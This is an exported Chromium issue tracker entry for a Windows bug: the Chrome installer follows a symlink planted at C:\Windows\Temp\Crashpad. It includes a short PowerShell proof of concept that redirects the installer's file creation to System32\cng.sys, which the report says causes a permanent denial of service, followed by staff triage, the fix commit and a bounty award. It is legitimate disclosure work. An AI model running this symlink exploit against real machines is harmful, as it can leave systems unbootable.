# Chrome Crashpad arbitrary file create

| Field | Value |
|-------|-------|
| **Issue ID** | [40063745](https://issues.chromium.org/issues/40063745) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals>Installer |
| **Platforms** | Windows |
| **Reporter** | yc...@gmail.com |
| **Assignee** | ga...@chromium.org |
| **Created** | 2023-03-24 |
| **Bounty** | $3,000.00 |

## Description

---

### Report description


Chrome Crashpad arbitrary file create


---

### Bug location


#### Which product or website have you found a vulnerability in?

Google Chrome


---

### The problem


#### Please describe the technical details of the vulnerability

## Chrome Crashpad arbitrary file create

## Basic Info

- Software Name: Chrome for Windows
- Software Version：111.0.5563.111 x64
- Test OS System：Windows 21H2 (19044.1826)
- Vuln Type：Arbitrary File Create
- Vuln Description：When installing the Chrome for Windows, it will create `C:\Windows\Temp\Crashpad\` directroy and files in it. However, it doesn't check if `C:\Windows\Temp\Crashpad`is a symlink. Because all Users can create files under `C:\Windows\Temp` .An attacker with low privilege can creates a symlink before administrator install chrome. The installer will follow the symlink and create files in other places. We can use trick here(https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) to utilize arbitrary folder create to get a permanent dos.

## Proof Of Concept

1. poc.ps1，Create a symlink

```
Import-Module ".\NtApiDotNet.dll" -ErrorAction Stop

$tmpDir = "C:\Windows\Temp\Crashpad"

$outDllPath = "C:\Windows\System32\cng.sys"

#create symbolink
[NtApiDotNet.NtFile]::CreateMountPoint("\??\$tmpDir", "\RPC Control", $null)
$out = [NtApiDotNet.NtSymbolicLink]::Create("\RPC Control\reports", "\??\$outDllPath")
```

2. install chrome, the install process will create C:\Windows\System32\cng.sys under C:\Windows\System32\
3. reboot windows system. and it will be a permanent dos.








#### Please briefly explain who can exploit the vulnerability, and what they gain when doing so

An attacker with low privilege in Windows system, it will finally get a permanent dos.


---

### The cause


#### What version of Chrome have you found the security issue in?

111.0.5563.111 x64 for Windows


#### Is the security issue related to a crash?

No


#### Choose the type of vulnerability

Privilege Escalation 


#### How would you like to be publicly acknowledged for your report?

ycdxsb from VARAS@IIE




## Timeline

### [Deleted User] (2023-03-24)

[Empty comment from Monorail migration]

### hc...@google.com (2023-03-24)

[Empty comment from Monorail migration]

### hc...@google.com (2023-03-24)

[Empty comment from Monorail migration]

### hc...@google.com (2023-03-24)

[Empty comment from Monorail migration]

### yc...@gmail.com (2023-03-25)

Hello,
     I put the details and poc video here: https://drive.google.com/file/d/1lRRcSKLcTWoSPIWIpoWDHG_4AanJkL_8/view?usp=sharing
Thanks

### wf...@chromium.org (2023-03-27)

yes I confirm this does happen, and is something we historically have tried to prevent in the installer. We should be creating the crashpad data directory somewhere else, as C:\windows\temp is typically writeable by normal user

the code that does this is here -> https://source.chromium.org/chromium/chromium/src/+/main:chrome/installer/setup/google_chrome_behaviors.cc;l=155

I suggest either picking another one if the dir already exists, using c:\windows\systemtemp instead, or doing the same thing that base does which is to create a dir in c:\program files.

Triaging as medium as this does require physical access to the workstation, but might allow certain eop scenarios.

[Monorail components: Internals>Installer]

### [Deleted User] (2023-03-27)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-28)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ga...@chromium.org (2023-03-29)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2023-03-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/455aa4e670edcdd734dc68f452b39af15303a371

commit 455aa4e670edcdd734dc68f452b39af15303a371
Author: S. Ganesh <ganesh@chromium.org>
Date: Thu Mar 30 01:50:49 2023

Fix Chrome Crashpad arbitrary file create

This CL uses a path `%systemroot%\SystemTemp`, if available, else uses a
path under `%programfiles%` for the Crashpad directory.

Both paths are only accessible to admin and system processes, and are
therefore secure.

Bug: 1427431
Change-Id: Ic61cda0ff8bc3f0ef5b0d38afe7e27c28d07bedb
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4380263
Reviewed-by: Will Harris <wfh@chromium.org>
Auto-Submit: S Ganesh <ganesh@chromium.org>
Commit-Queue: S Ganesh <ganesh@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1123994}

[modify] https://crrev.com/455aa4e670edcdd734dc68f452b39af15303a371/chrome/installer/setup/setup_util.h
[modify] https://crrev.com/455aa4e670edcdd734dc68f452b39af15303a371/chrome/installer/setup/setup_util_unittest.cc
[modify] https://crrev.com/455aa4e670edcdd734dc68f452b39af15303a371/chrome/installer/setup/installer_crash_reporting.cc
[modify] https://crrev.com/455aa4e670edcdd734dc68f452b39af15303a371/chrome/installer/setup/setup_util.cc


### ga...@chromium.org (2023-03-30)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-30)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-30)

[Empty comment from Monorail migration]

### am...@google.com (2023-04-13)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-04-13)

Congratulations, ycdxsb! The VRP Panel has decided to award you $3,000 for this report. A member of our finance team will be in touch with you soon to arrange payment. Thank you for your efforts and reporting this issue to us! 

### am...@google.com (2023-04-14)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-05-25)

[Empty comment from Monorail migration]

### am...@google.com (2023-05-30)

[Empty comment from Monorail migration]

### pg...@google.com (2023-05-30)

[Empty comment from Monorail migration]

### [Deleted User] (2023-07-06)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1427431?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/1427430, crbug.com/chromium/1427433, crbug.com/chromium/1427435]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40063745)*
